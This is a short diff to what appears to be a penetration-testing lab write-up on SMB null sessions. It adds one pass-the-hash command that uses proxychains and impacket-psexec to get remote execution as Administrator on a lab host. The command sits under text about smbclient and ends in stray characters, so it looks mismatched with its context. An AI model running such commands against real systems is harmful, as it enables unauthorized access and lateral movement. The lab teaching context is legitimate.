@@ -508,6 +508,8 @@ Example:
 <img src="/assets/images/pts_labs/null_sessions/checking12.png" height="60%" width="60%">
 <br/>
 You can also perform the very same checks by using smbclient:
+    
+    proxychains impacket-psexec -no-pass Administrator@10.10.10.10 -hashes :admin_hash>`
 <br/>
 <img src="/assets/images/pts_labs/null_sessions/checking13.png" height="70%" width="70%">
 </details>
